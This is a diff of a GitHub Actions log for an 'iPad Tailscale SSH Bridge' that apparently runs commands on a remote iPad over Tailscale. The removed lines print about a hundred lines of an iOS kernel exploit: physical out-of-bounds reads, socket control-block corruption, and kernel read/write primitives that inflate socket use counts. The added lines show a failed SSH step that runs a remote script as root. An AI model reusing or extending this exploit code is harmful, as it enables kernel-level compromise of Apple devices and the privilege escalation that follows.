@@ -1,111 +1,24 @@
 iPad Tailscale SSH Bridge
-run_id=30150632593
-run_url=https://github.com/NightVibes33/Codex-DEB-Test/actions/runs/30150632593
-commit=8ced28f5f79cd0f54f669615cc4ec4809a4c74da
+run_id=30150772302
+run_url=https://github.com/NightVibes33/Codex-DEB-Test/actions/runs/30150772302
+commit=492bf619e7abf1e3bcaa8ad01c624c27fbacc5d9
 environment=TAILSCALE_AUTHKEY-
 validate=success
 tailscale=success
 install_ssh=success
-ssh=success
+ssh=failure
 
 --- sanitized SSH output ---
-0778:         }
-0779:         NSMutableArray<NSNumber *> *searchMappings = [NSMutableArray new];
-0780:         for (uint64_t s = 0; s < searchMappingNum; s++) {
-0781:             mach_vm_address_t searchMappingAddress = 0;
-0782:             kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
-0783:             if (kr != KERN_SUCCESS) {
-0784:                 printf("[-] mach_vm_allocate failed!!! (%s)\n", mach_error_string(kr));
-0785:                 FAILURE(0);
-anchor='surface_mlock(searchMappingAddress' hits=1 lines=[823]
---- surface_mlock(searchMappingAddress context 815-857 ---
-0815:             printf("[i] looking in search mapping: %llu\n", s);
-0816:             mach_port_t memoryObject = 0;
-0817:             mach_vm_size_t memoryObjectSize = searchMappingSize;
-0818:             kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize, searchMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
-0819:             if (kr != KERN_SUCCESS) {
-0820:                 printf("[-] mach_make_memory_entry_64 failed!!!");
-0821:                 FAILURE(0);
-0822:             }
-0823:             surface_mlock(searchMappingAddress, searchMappingSize);
-0824:             mach_vm_offset_t seekingOffset = 0;
-0825:             // fix mach_vm_map err on free thread, we'd try to map outside mo
-0826:             while (seekingOffset <= searchMappingSize - pcSize) {
-0827:                 kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
-0828:                 if (kr == KERN_SUCCESS) {
-0829:                     if (find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer, writeBuffer, targetInpGencntList, false) == KERN_SUCCESS) {
-0830:                         success = true;
-0831:                         break;
-0832:                     }
-0833:                 }
-0834:                 seekingOffset += PAGE_SIZE;
-0835:             }
-0836:             kr = mach_port_deallocate(mach_task_self(), memoryObject);
-0837:             if (kr != KERN_SUCCESS) {
-0838:                 printf("[-] mach_port_deallocate failed!!!\n");
-0839:                 FAILURE(0);
-0840:             }
-0841:             if (success == true) {
-0842:                 break;
-0843:             }
-0844:         }
-0845:         sockets_release(socketPorts, socketPcbIds);
-0846:         for (uint64_t s = 0; s < searchMappingNum; s++) {
-0847:             mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
-0848:             [searchMappings removeLastObject];
-0849:             kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
-0850:         }
-0851:         if (isA18Device) {
-0852:             surface_munlock(wiredMapping, wiredMappingSize);
-0853:         }
-0854:         if (success == true) {
-0855:             break;
-0856:         }
-0857:     }
-anchor='sockets_release(socketPorts' hits=1 lines=[845]
---- sockets_release(socketPorts context 837-879 ---
-0837:             if (kr != KERN_SUCCESS) {
-0838:                 printf("[-] mach_port_deallocate failed!!!\n");
-0839:                 FAILURE(0);
-0840:             }
-0841:             if (success == true) {
-0842:                 break;
-0843:             }
-0844:         }
-0845:         sockets_release(socketPorts, socketPcbIds);
-0846:         for (uint64_t s = 0; s < searchMappingNum; s++) {
-0847:             mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
-0848:             [searchMappings removeLastObject];
-0849:             kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
-0850:         }
-0851:         if (isA18Device) {
-0852:             surface_munlock(wiredMapping, wiredMappingSize);
-0853:         }
-0854:         if (success == true) {
-0855:             break;
-0856:         }
-0857:     }
-0858: }
-0859: 
-0860: void pe_v2(void)
-0861: {
-0862:     // TODO: Implement
-0863: }
-0864: 
-0865: void krw_sockets_leak_forever(void)
-0866: {
-0867:     uint64_t controlSocketAddr = early_kread64(controlSocketPcb + koffsetof(inpcb, socket));
-0868:     uint64_t rwSocketAddr = early_kread64(rwSocketPcb + koffsetof(inpcb, socket));
-0869: 
-0870:     if (!controlSocketAddr || !rwSocketAddr) {
-0871:         printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
-0872:         FAILURE(0);
-0873:     }
-0874: 
-0875:     uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + koffsetof(socket, usecount));
-0876:     uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + koffsetof(socket, usecount));
-0877:     early_kwrite64(controlSocketAddr + koffsetof(socket, usecount), controlSocketSoCount + 0x0000100100001001);
-0878:     early_kwrite64(rwSocketAddr + koffsetof(socket, usecount), rwSocketSoCount + 0x0000100100001001);
-0879: 
-inspection=complete
-ssh_exit_code=0
+Checking SSH host key over Tailscale...
+# 100.116.117.65:22 SSH-2.0-OpenSSH_9.7
+# 100.116.117.65:22 SSH-2.0-OpenSSH_9.7
+# 100.116.117.65:22 SSH-2.0-OpenSSH_9.7
+# 100.116.117.65:22 SSH-2.0-OpenSSH_9.7
+# 100.116.117.65:22 SSH-2.0-OpenSSH_9.7
+Running remote/ipad-command.sh on mobile@100.116.117.65:22 as root...
+git@github.com: Permission denied (publickey).
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+ssh_exit_code=128
